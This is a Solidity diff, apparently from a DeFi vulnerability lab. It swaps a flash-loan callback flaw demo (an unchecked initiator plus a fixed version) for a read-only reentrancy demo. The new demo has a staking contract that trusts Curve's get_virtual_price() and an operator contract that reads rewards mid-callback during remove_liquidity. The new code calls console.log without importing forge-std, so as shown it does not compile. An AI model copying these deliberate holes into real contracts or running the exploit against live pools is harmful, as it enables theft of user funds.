@@ -1,163 +1,99 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.18;
+pragma solidity 0.8.18;
 
-import "forge-std/Test.sol";
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-import "@openzeppelin/contracts/access/Ownable.sol";
-import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-contract ContractTest is Test {
-    USDa USDaContract;
-    LendingPool LendingPoolContract;
-    SimpleBankAlt SimpleBankContract;
-    SimpleBankV2 SimpleBankContractV2;
+interface ICurve {
+    function get_virtual_price() external view returns (uint);
 
-    function setUp() public {
-        USDaContract = new USDa();
-        LendingPoolContract = new LendingPool(address(USDaContract));
-        SimpleBankContract = new SimpleBankAlt(
-            address(LendingPoolContract),
-            address(USDaContract)
-        );
-        USDaContract.transfer(address(LendingPoolContract), 10000 ether);
-        SimpleBankContractV2 = new SimpleBankV2(
-            address(LendingPoolContract),
-            address(USDaContract)
-        );
-    }
+    function add_liquidity(
+        uint[2] calldata amounts,
+        uint min_mint_amount
+    ) external payable returns (uint);
 
-    function testFlashLoanFlaw() public {
-        LendingPoolContract.flashLoan(
-            500 ether,
-            address(SimpleBankContract),
-            "0x0"
-        );
-    }
+    function remove_liquidity(
+        uint lp,
+        uint[2] calldata min_amounts
+    ) external returns (uint[2] memory);
 
-    function testFlashLoanSecure() public {
-        vm.expectRevert("Unauthorized");
-        LendingPoolContract.flashLoan(
-            500 ether,
-            address(SimpleBankContractV2),
-            "0x0"
-        );
-    }
-
-    receive() external payable {}
+    function remove_liquidity_one_coin(
+        uint lp,
+        int128 i,
+        uint min_amount
+    ) external returns (uint);
 }
 
-contract SimpleBankAlt {
-    using SafeERC20 for IERC20;
-    IERC20 public USDa;
-    LendingPool public lendingPool;
+address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
+address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token
 
-    constructor(address _lendingPoolAddress, address _asset) {
-        lendingPool = LendingPool(_lendingPoolAddress);
-        USDa = IERC20(_asset);
+// CoreContract
+// users stake LP_TOKEN
+// getReward rewards the users based on the current price of the pool LP token
+contract CoreContract {
+    IERC20 public constant token = IERC20(LP_TOKEN);
+    ICurve private constant pool = ICurve(STETH_POOL);
+
+    mapping(address => uint) public balanceOf;
+
+    function stake(uint amount) external {
+        token.transferFrom(msg.sender, address(this), amount);
+        balanceOf[msg.sender] += amount;
     }
 
-    function flashLoan(
-        uint256 amounts,
-        address receiverAddress,
-        bytes calldata data
-    ) external {
-        receiverAddress = address(this);
-
-        lendingPool.flashLoan(amounts, receiverAddress, data);
+    function unstake(uint amount) external {
+        balanceOf[msg.sender] -= amount;
+        token.transfer(msg.sender, amount);
     }
 
-    function executeOperation(
-        uint256 amounts,
-        address receiverAddress,
-        address _initiator,
-        bytes calldata data
-    ) external {
-        /* Perform your desired logic here
-        Open opsition, close opsition, drain funds, etc.
-        _closetrade(...) or _opentrade(...)
-        */
-
-        // transfer all borrowed assets back to the lending pool
-        IERC20(USDa).safeTransfer(address(lendingPool), amounts);
+    function getReward() external view returns (uint) {
+        //rewarding tokens based on the current virtual price of the pool LP token
+        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
+            1 ether;
+        // Omitting code to transfer reward tokens
+        return reward;
     }
 }
 
-contract SimpleBankV2 {
-    using SafeERC20 for IERC20;
-    IERC20 public USDa;
-    LendingPool public lendingPool;
+contract OperatorContract {
+    ICurve private constant pool = ICurve(STETH_POOL);
+    IERC20 public constant lpToken = IERC20(LP_TOKEN);
+    CoreContract private immutable target;
 
-    constructor(address _lendingPoolAddress, address _asset) {
-        lendingPool = LendingPool(_lendingPoolAddress);
-        USDa = IERC20(_asset);
+    constructor(address _target) {
+        target = CoreContract(_target);
     }
 
-    function flashLoan(
-        uint256 amounts,
-        address receiverAddress,
-        bytes calldata data
-    ) external {
-        address receiverAddress = address(this);
-
-        lendingPool.flashLoan(amounts, receiverAddress, data);
-    }
-
-    function executeOperation(
-        uint256 amounts,
-        address receiverAddress,
-        address _initiator,
-        bytes calldata data
-    ) external {
-
-        require(_initiator == address(this), "Unauthorized");
-
-        // transfer all borrowed assets back to the lending pool
-        IERC20(USDa).safeTransfer(address(lendingPool), amounts);
-    }
-}
-
-contract USDa is ERC20, Ownable {
-    constructor() ERC20("USDA", "USDA") {
-        _mint(msg.sender, 10000 * 10 ** decimals());
-    }
-
-    function mint(address to, uint256 amount) public onlyOwner {
-        _mint(to, amount);
-    }
-}
-
-interface IFlashLoanReceiver {
-    function executeOperation(
-        uint256 amounts,
-        address receiverAddress,
-        address _initiator,
-        bytes calldata data
-    ) external;
-}
-
-contract LendingPool {
-    IERC20 public USDa;
-
-    constructor(address _USDA) {
-        USDa = IERC20(_USDA);
-    }
-
-    function flashLoan(
-        uint256 amount,
-        address borrower,
-        bytes calldata data
-    ) public {
-        uint256 balanceBefore = USDa.balanceOf(address(this));
-        require(balanceBefore >= amount, "Not enough liquidity");
-        require(USDa.transfer(borrower, amount), "Flashloan transfer failed");
-        IFlashLoanReceiver(borrower).executeOperation(
-            amount,
-            borrower,
-            msg.sender,
-            data
+    // Stake LP into CoreContract
+    function stakeTokens() external payable {
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        console.log(
+            "LP token price after staking into CoreContract",
+            pool.get_virtual_price()
         );
 
-        uint256 balanceAfter = USDa.balanceOf(address(this));
-        require(balanceAfter >= balanceBefore, "Flashloan not repaid");
+        lpToken.approve(address(target), lp);
+        target.stake(lp);
+    }
+
+    function performReadOnlyCallback() external payable {
+        // Add liquidity to Curve
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        // Log get_virtual_price
+        console.log(
+            "LP token price before remove_liquidity()",
+            pool.get_virtual_price()
+        );
+        // Remove liquidity from Curve
+        // remove_liquidity() invokes the recieve() callback
+        uint[2] memory min_amounts = [uint(0), uint(0)];
+        pool.remove_liquidity(lp, min_amounts);
+
+        uint reward = target.getReward();
+    }
+
+    receive() external payable {
+        uint reward = target.getReward();
     }
 }
